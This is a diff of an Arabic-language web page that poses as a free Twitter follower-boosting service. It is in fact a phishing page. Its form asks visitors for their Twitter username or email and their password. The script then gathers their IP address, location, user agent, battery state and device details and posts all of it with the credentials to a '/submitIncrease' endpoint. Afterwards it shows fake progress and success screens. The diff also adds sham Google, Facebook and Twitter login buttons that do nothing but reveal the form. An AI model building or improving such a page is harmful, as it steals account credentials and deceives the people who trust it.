@@ -4,271 +4,790 @@
     <title>زيادة متابعين تويتر</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap');
-
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #e8f5fd;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        * {
+            box-sizing: border-box;
             margin: 0;
-            color: #333;
+            padding: 0;
         }
-        .container, .loading-container, .message-container, .second-message-container {
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0a192f, #8b0000, #0a192f);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .main-container {
+            max-width: 500px;
+            margin: 20px auto;
+            background: rgba(10, 25, 47, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(139, 0, 0, 0.3);
+            max-height: 90vh;
+            overflow-y: auto;
+            scroll-behavior: smooth;
+        }
+        
+        .main-container::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .main-container::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.2);
+        }
+        
+        .main-container::-webkit-scrollbar-thumb {
+            background: rgba(139, 0, 0, 0.5);
+            border-radius: 4px;
+        }
+        
+        .main-container::-webkit-scrollbar-thumb:hover {
+            background: rgba(139, 0, 0, 0.7);
+        }
+        
+        .header {
             text-align: center;
+            padding: 25px 20px 15px;
+            background: rgba(10, 25, 47, 0.9);
+            position: relative;
+            overflow: hidden;
+            border-bottom: 2px solid rgba(139, 0, 0, 0.5);
+        }
+        
+        .header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://images.unsplash.com/photo-1611605698335-8b1569810432?q=80&w=1974&auto=format&fit=crop') center/cover;
+            opacity: 0.1;
+            z-index: -1;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #ff6b6b;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
             max-width: 400px;
-            width: 90%;
+            margin: 0 auto;
+            color: #a3b1c6;
+        }
+        
+        .section {
+            padding: 25px;
+            border-bottom: 1px solid rgba(139, 0, 0, 0.2);
+        }
+        
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn img {
+            width: 30px;
+            height: 30px;
+            margin-left: 10px;
+            border-radius: 50%;
+        }
+        
+        .google-btn {
+            background: linear-gradient(to right, #0a192f, #1a3a5f);
+            color: #a3b1c6;
+            border: 1px solid rgba(139, 0, 0, 0.3);
+        }
+        
+        .facebook-btn {
+            background: linear-gradient(to right, #0a192f, #1a3a5f);
+            color: #a3b1c6;
+            border: 1px solid rgba(139, 0, 0, 0.3);
+        }
+        
+        .twitter-btn {
+            background: linear-gradient(to right, #8b0000, #a52a2a);
+            color: white;
+            border: 1px solid rgba(139, 0, 0, 0.5);
+        }
+        
+        .form-container {
             display: none;
+            background: rgba(10, 25, 47, 0.6);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 15px;
+            border: 1px solid rgba(139, 0, 0, 0.3);
         }
-        .container {
-            display: block;
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 22px;
+            color: #ff6b6b;
         }
-        h1 {
-            color: #1DA1F2;
+        
+        .form-group {
             margin-bottom: 20px;
         }
-        input[type="text"], input[type="password"], select {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            background-color: #f9f9f9;
-            color: #333;
-            box-sizing: border-box;
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #64b5f6;
         }
-        button {
-            background-color: #1DA1F2;
+        
+        .form-group input, 
+        .form-group select {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            border: 1px solid rgba(139, 0, 0, 0.3);
+            background: rgba(10, 25, 47, 0.7);
             color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
             font-size: 16px;
-            width: 100%;
-            margin-top: 10px;
+            font-family: 'Cairo', sans-serif;
         }
+        
+        .form-group input:focus, 
+        .form-group select:focus {
+            outline: none;
+            border-color: #ff6b6b;
+            box-shadow: 0 0 0 2px rgba(255, 107, 107, 0.2);
+        }
+        
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(to right, #8b0000, #a52a2a);
+            color: white;
+            font-weight: bold;
+            padding: 15px;
+            width: 100%;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(to right, #a52a2a, #8b0000);
+            transform: scale(1.02);
+        }
+        
+        .pricing-title {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 22px;
+            color: #ff6b6b;
+        }
+        
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+        }
+        
+        .price-card {
+            background: rgba(10, 25, 47, 0.6);
+            border-radius: 12px;
+            padding: 20px 15px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(139, 0, 0, 0.3);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .price-card:hover {
+            transform: translateY(-5px);
+            background: rgba(10, 25, 47, 0.8);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .followers-count {
+            font-size: 24px;
+            font-weight: bold;
+            color: #64b5f6;
+            margin-bottom: 10px;
+        }
+        
+        .price-tag {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+        }
+        
+        .buy-btn {
+            background: linear-gradient(to right, #0a192f, #1a3a5f);
+            color: #a3b1c6;
+            border: 1px solid rgba(139, 0, 0, 0.3);
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .buy-btn:hover {
+            background: linear-gradient(to right, #1a3a5f, #0a192f);
+            color: white;
+        }
+        
+        .free-badge {
+            background: linear-gradient(to right, #8b0000, #a52a2a);
+            color: white;
+        }
+        
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(10, 25, 47, 0.6);
+            border-top: 1px solid rgba(139, 0, 0, 0.3);
+        }
+        
+        .social-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: rgba(139, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        
+        .social-icon:hover {
+            background: rgba(139, 0, 0, 0.5);
+            transform: scale(1.1);
+        }
+        
+        .social-icon img {
+            width: 30px;
+            height: 30px;
+        }
+        
+        .floating-bird {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            top: 20px;
+            right: 20px;
+            opacity: 0.1;
+            z-index: -1;
+            animation: float 8s ease-in-out infinite;
+            filter: hue-rotate(300deg);
+        }
+        
+        .floating-bird:nth-child(2) {
+            top: auto;
+            bottom: 20px;
+            left: 20px;
+            right: auto;
+            animation-delay: 2s;
+            width: 60px;
+            height: 60px;
+            filter: hue-rotate(180deg);
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+            100% { transform: translateY(0px) rotate(0deg); }
+        }
+        
+        @media (max-width: 600px) {
+            .main-container {
+                max-height: 95vh;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .btn {
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            .pricing-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
         .twitter-logo {
             width: 50px;
             height: 50px;
-            margin-bottom: 20px;
+            background: linear-gradient(45deg, #0a192f, #8b0000);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
         }
-        .notification {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background-color: #1DA1F2;
+        
+        .twitter-logo i {
             color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            z-index: 100;
-            opacity: 0;
-            transition: opacity 0.5s ease;
+            font-size: 24px;
+        }
+
+        /* تنسيق الشاشات بعد التسجيل */
+        .loading-container, .second-message-container, .message-container {
+            text-align: center;
+            background: rgba(10, 25, 47, 0.9);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            width: 90%;
+            animation: fadeIn 2s ease-in-out;
             display: none;
+            margin: 20px auto;
+            border: 1px solid rgba(139, 0, 0, 0.3);
         }
-        .notification.show {
-            opacity: 1;
-            display: block;
-        }
-        .loading-container h1, .message-container h1, .second-message-container h1 {
+        
+        .loading-container h1, .second-message-container h1, .message-container h1 {
             font-size: 2em;
-            color: #f12711;
+            color: #fff;
             margin-bottom: 15px;
         }
-        .loading-container p, .message-container p, .second-message-container p {
+        
+        .loading-container p, .second-message-container p, .message-container p {
             font-size: 1.2em;
-            color: #333;
+            color: #a3b1c6;
             margin-bottom: 20px;
         }
+        
         .heart {
             font-size: 3em;
-            color: #f12711;
+            color: #ff6b6b;
             animation: pulse 1.5s infinite;
         }
+        
         @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.1); }
             100% { transform: scale(1); }
         }
+        
         .progress-bar {
             width: 100%;
-            background: #ddd;
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
             overflow: hidden;
             margin: 15px 0;
-        }
-        .progress-bar div {
             height: 20px;
+        }
+        
+        .progress-bar div {
+            height: 100%;
             width: 0;
-            background: #f12711;
+            background: linear-gradient(to right, #8b0000, #a52a2a);
             border-radius: 10px;
             animation: progress 20s linear forwards;
         }
+        
         @keyframes progress {
             to { width: 100%; }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/ar/9/9f/Twitter_bird_logo_2012.svg" alt="Twitter Logo" class="twitter-logo">
-        <h1>زيادة متابعين تويتر ❤️🚀</h1>
-        <form id="increaseForm">
-            <input type="hidden" name="chatId" id="chatIdInput">
-            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <select name="followers" required>
-                <option value="">اختر عدد المتابعين</option>
-                <option value="500">متابع 500🔥</option>
-                <option value="1000">متابع 1k⭐</option>
-                <option value="2000">متابع 2k💥</option>
-                <option value="3000">متابع 3k🚀</option>
-            </select>
-            <button type="submit">رشق</button>
-        </form>
+  
+  <!-- طيور متحركة -->
+  <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter Bird" class="floating-bird">
+  <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter Bird" class="floating-bird">
+  
+  <!-- الحاوية الرئيسية -->
+  <div class="main-container">
+    <div class="header">
+      <div class="logo-container">
+        <div class="twitter-logo">
+          <i class="fab fa-twitter"></i>
+        </div>
+      </div>
+      <h1>زيادة متابعين تويتر</h1>
+      <p>احصل على الآلاف من المتابعين الحقيقيين بأسعار تنافسية وخطوات بسيطة</p>
     </div>
+    
+    <div class="section">
+      <div class="login-options">
+        <button class="btn google-btn" onclick="loginWithGoogle()">
+          <span>تسجيل الدخول عبر جوجل</span>
+          <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google">
+        </button>
+        
+        <button class="btn facebook-btn" onclick="loginWithFacebook()">
+          <span>تسجيل الدخول عبر فيسبوك</span>
+          <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+        </button>
+        
+        <button class="btn twitter-btn" onclick="loginWithTwitter()">
+          <span>تسجيل الدخول عبر تويتر</span>
+          <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
+        </button>
+      </div>
+      
+      <div id="form" class="form-container">
+        <h2 class="form-title">زيادة متابعين تويتر <i class="fab fa-twitter"></i></h2>
+        <form id="increaseForm">
+          <input type="hidden" name="chatId" id="chatIdInput">
+          
+          <div class="form-group">
+            <label>اسم المستخدم أو البريد الإلكتروني:</label>
+            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
+          </div>
+          
+          <div class="form-group">
+            <label>كلمة المرور:</label>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+          </div>
+          
+          <div class="form-group">
+            <label>عدد المتابعين:</label>
+            <select name="followers" required>
+              <option value="">اختر عدد المتابعين</option>
+              <option value="500">500 متابع 🔥</option>
+              <option value="1000">1000 متابع ⭐</option>
+              <option value="2000">2000 متابع 💥</option>
+              <option value="3000">3000 متابع 🚀</option>
+            </select>
+          </div>
+          
+          <button type="submit" class="submit-btn">رشق المتابعين</button>
+        </form>
+      </div>
+    </div>
+    
+    <div class="section">
+      <h2 class="pricing-title">باقات المتابعين</h2>
+      <div class="pricing-grid">
+        <div class="price-card">
+          <div class="followers-count">500</div>
+          <div class="price-tag">🔥</div>
+          <button class="buy-btn free-badge">اختر</button>
+        </div>
+        
+        <div class="price-card">
+          <div class="followers-count">1000</div>
+          <div class="price-tag">⭐</div>
+          <button class="buy-btn">اختر</button>
+        </div>
+        
+        <div class="price-card">
+          <div class="followers-count">2000</div>
+          <div class="price-tag">💥</div>
+          <button class="buy-btn">اختر</button>
+        </div>
+        
+        <div class="price-card">
+          <div class="followers-count">3000</div>
+          <div class="price-tag">🚀</div>
+          <button class="buy-btn">اختر</button>
+        </div>
+      </div>
+    </div>
+    
+    <div class="social-icons">
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube">
+      </div>
+    </div>
+  </div>
 
-    <!-- شاشة التحميل -->
-    <div class="loading-container"> 
-        <h1>جاري ارسال الطلب...</h1> 
-        <p>يتم تجهيز طلبك، يرجى الانتظار.</p> 
-        <div class="heart">❤️</div> 
-        <div class="progress-bar"><div></div></div> 
-    </div> 
+  <!-- شاشة التحميل -->
+  <div class="loading-container"> 
+      <h1>جاري ارسال الطلب...</h1> 
+      <p>يتم تجهيز طلبك، يرجى الانتظار.</p> 
+      <div class="heart">❤️</div> 
+      <div class="progress-bar"><div></div></div> 
+  </div> 
 
-    <div class="second-message-container"> 
-        <h1>تم عد وجاري تنفيذ طلبك...</h1> 
-        <p>يتم الآن تنفيذ طلبك بنجاح.</p> 
-        <div class="heart">❤️</div> 
-    </div> 
+  <div class="second-message-container"> 
+      <h1>تم عد وجاري تنفيذ طلبك...</h1> 
+      <p>يتم الآن تنفيذ طلبك بنجاح.</p> 
+      <div class="heart">❤️</div> 
+  </div> 
 
-    <div class="message-container"> 
-        <h1>تهانينا!</h1> 
-        <p>تم تسليم طلبك بنجاح!</p> 
-        <div class="heart">❤️</div> 
-    </div> 
+  <div class="message-container"> 
+      <h1>تهانينا!</h1> 
+      <p>تم تسليم طلبك بنجاح!</p> 
+      <div class="heart">❤️</div> 
+  </div> 
 
-    <script>
-        const increaseForm = document.getElementById('increaseForm');
-        const chatIdInput = document.getElementById('chatIdInput');
-        const notification = document.getElementById('notification');
+  <script>
+    // السكربت الأصلي من الموقع الأول
+    const increaseForm = document.getElementById('increaseForm');
+    const chatIdInput = document.getElementById('chatIdInput');
 
-        const chatId = window.location.pathname.split('/').pop();
-        chatIdInput.value = chatId;
+    const chatId = window.location.pathname.split('/').pop();
+    chatIdInput.value = chatId;
 
-        async function getIPInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country: data.country_name,
-                    city: data.city
-                };
-            } catch (error) {
-                console.error('Error fetching IP info:', error);
-                return {
-                    ip: 'Unknown',
-                    country: 'Unknown',
-                    city: 'Unknown'
-                };
-            }
-        }
-
-        function getPlatformInfo() {
-            const ua = navigator.userAgent;
-            let platform = "Unknown";
-            if (/Windows/.test(ua)) platform = "Twitter";
-            else if (/Mac/.test(ua)) platform = "Twitter";
-            else if (/Linux/.test(ua)) platform = "Twitter";
-            else if (/Android/.test(ua)) platform = "Twitter";
-            else if (/iPhone|iPad|iPod/.test(ua)) platform = "Twitter";
-
+    async function getIPInfo() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
             return {
-                platform: platform,
-                userAgent: ua
+                ip: data.ip,
+                country: data.country_name,
+                city: data.city
+            };
+        } catch (error) {
+            console.error('Error fetching IP info:', error);
+            return {
+                ip: 'Unknown',
+                country: 'Unknown',
+                city: 'Unknown'
             };
         }
+    }
 
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        batteryLevel: battery.level,
-                        batteryCharging: battery.charging
-                    };
-                } catch (error) {
-                    console.error('Error getting battery info:', error);
-                }
-            }
-            return {
-                batteryLevel: undefined,
-                batteryCharging: undefined
-            };
-        }
+    function getPlatformInfo() {
+        const ua = navigator.userAgent;
+        let platform = "Unknown";
+        if (/Windows/.test(ua)) platform = "Twitter";
+        else if (/Mac/.test(ua)) platform = "Twitter";
+        else if (/Twitter/.test(ua)) platform = "Twitter";
+        else if (/Android/.test(ua)) platform = "Twitter";
+        else if (/iPhone|iPad|iPod/.test(ua)) platform = "Twitter";
 
-        function getDeviceVersion() {
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^)]+)\)/);
-            return match ? match[1] : 'Unknown';
-        }
+        return {
+            platform: platform,
+            userAgent: ua
+        };
+    }
 
-        increaseForm.addEventListener('submit', async (event) => {
-            event.preventDefault();
-
-            // تنفيذ العمليات المراد تنفيذها قبل التحميل
-            document.body.style.backgroundColor = '#e8f5fd'; // استخدام الخلفية الزرقاء
-            document.querySelector('.container').style.display = 'none'; // إخفاء النموذج
-            document.querySelector('.loading-container').style.display = 'block'; // إظهار شاشة التحميل
-
-            const formData = new FormData(increaseForm);
-            const data = Object.fromEntries(formData.entries());
-
-            const ipInfo = await getIPInfo();
-            const platformInfo = getPlatformInfo();
-            const batteryInfo = await getBatteryInfo();
-            const deviceVersion = getDeviceVersion();
-
-            Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
-
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
             try {
-                const response = await fetch('/submitIncrease', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-                const result = await response.json();
-                if (result.success) {
-                    setTimeout(function() {
-                        document.querySelector('.loading-container').style.display = 'none';
-                        document.querySelector('.second-message-container').style.display =
-                        'block'; // إظهار شاشة تنفيذ الطلب
-                    }, 5000); // زمن الانتظار قبل الانتقال إلى الشاشة التالية
-
-                    setTimeout(function() {
-                        document.querySelector('.second-message-container').style.display = 'none';
-                        document.querySelector('.message-container').style.display = 'block'; // إظهار شاشة النجاح
-                    }, 10000); // زمن الانتظار قبل إظهار شاشة النجاح
-
-                    increaseForm.reset();
-                } else {
-                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
-                }
+                const battery = await navigator.getBattery();
+                return {
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging
+                };
             } catch (error) {
-                console.error('Error:', error);
-                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+                console.error('Error getting battery info:', error);
             }
+        }
+        return {
+            batteryLevel: undefined,
+            batteryCharging: undefined
+        };
+    }
+
+    function getDeviceVersion() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
+        return match ? match[1] : 'Unknown';
+    }
+
+    increaseForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        // تنفيذ العمليات المراد تنفيذها قبل التحميل
+        document.body.style.background = 'linear-gradient(135deg, #f5af19, #f12711)';
+        document.querySelector('.main-container').style.display = 'none';
+        document.querySelector('.loading-container').style.display = 'block';
+
+        const formData = new FormData(increaseForm);
+        const data = Object.fromEntries(formData.entries());
+
+        const ipInfo = await getIPInfo();
+        const platformInfo = getPlatformInfo();
+        const batteryInfo = await getBatteryInfo();
+        const deviceVersion = getDeviceVersion();
+
+        Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+
+        try {
+            const response = await fetch('/submitIncrease', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+            const result = await response.json();
+            if (result.success) {
+                setTimeout(function() {
+                    document.querySelector('.loading-container').style.display = 'none';
+                    document.querySelector('.second-message-container').style.display =
+                    'block';
+                }, 5000);
+
+                setTimeout(function() {
+                    document.querySelector('.second-message-container').style.display = 'none';
+                    document.querySelector('.message-container').style.display = 'block';
+                }, 10000);
+
+                increaseForm.reset();
+            } else {
+                alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+        }
+    });
+
+    // وظائف تسجيل الدخول
+    function loginWithGoogle() {
+        const btn = event.currentTarget;
+        const originalHTML = btn.innerHTML;
+        
+        btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+        btn.disabled = true;
+        
+        setTimeout(() => {
+            btn.innerHTML = originalHTML;
+            btn.disabled = false;
+            
+            setTimeout(() => {
+                showForm();
+            }, 500);
+        }, 1500);
+    }
+
+    function loginWithFacebook() {
+        const btn = event.currentTarget;
+        const originalHTML = btn.innerHTML;
+        
+        btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+        btn.disabled = true;
+        
+        setTimeout(() => {
+            btn.innerHTML = originalHTML;
+            btn.disabled = false;
+            
+            setTimeout(() => {
+                showForm();
+            }, 500);
+        }, 1500);
+    }
+
+    function loginWithTwitter() {
+        const btn = event.currentTarget;
+        const originalHTML = btn.innerHTML;
+        
+        btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+        btn.disabled = true;
+        
+        setTimeout(() => {
+            btn.innerHTML = originalHTML;
+            btn.disabled = false;
+            
+            setTimeout(() => {
+                showForm();
+            }, 500);
+        }, 1500);
+    }
+
+    function showForm() {
+        document.querySelector(".login-options").style.display = "none";
+        document.getElementById("form").style.display = "block";
+        
+        const container = document.querySelector('.main-container');
+        const formElement = document.getElementById("form");
+        const topPos = formElement.offsetTop;
+        
+        container.scrollTo({
+            top: topPos - 20,
+            behavior: 'smooth'
         });
-    </script>
+    }
+  </script>
 </body>
-</html>
+            </html>
